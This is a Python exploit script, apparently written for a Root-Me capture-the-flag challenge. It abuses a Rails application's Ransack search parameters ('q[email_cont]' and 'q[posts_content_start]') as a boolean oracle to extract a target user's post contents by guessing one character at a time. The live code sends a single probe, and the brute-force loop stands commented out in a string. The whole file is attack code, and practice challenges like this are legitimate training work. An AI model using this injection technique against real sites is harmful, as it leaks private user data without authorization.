import requests
import re

class Ransack:
    url = ""
    target = ""

    def __init__(self, url):
        self.url = url

    def setTarget(self, target):
        self.target = target

    def sendPayload(self, payload):
        params = {
            "utf8": "✓",
            "q[email_cont]": self.target,
            "q[posts_content_start]": payload
        }
        r = requests.get(self.url, params=params, allow_redirects=False)
        pattern = r"<h2>\s*No result\s*</h2>"
        return not re.search(pattern, r.content.decode(), re.IGNORECASE)

    def getPost(self):
        if self.target == "":
            print("[-] Target undefined.")
            return

        charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*"

        if not self.sendPayload("a"):
            print("Invalide")
        else:
            print("Valide")

"""
        payload = ""
        i = 0
        while i < 10:
            for c in charset:
                payload += c
                print(f"[ ] Attempting '{payload}'")
                if not self.sendPayload(payload):
                    payload = payload[:-1]
                    print("[-] Nope restaure to", payload)
                i += 1
        return payload"""

url     = "http://challenge01.root-me.org:59097/users"
target  = "gwittfeld@example.com"
exploit = Ransack(url)
exploit.setTarget(target)
print("[+] Start searching...")
print(exploit.getPost())
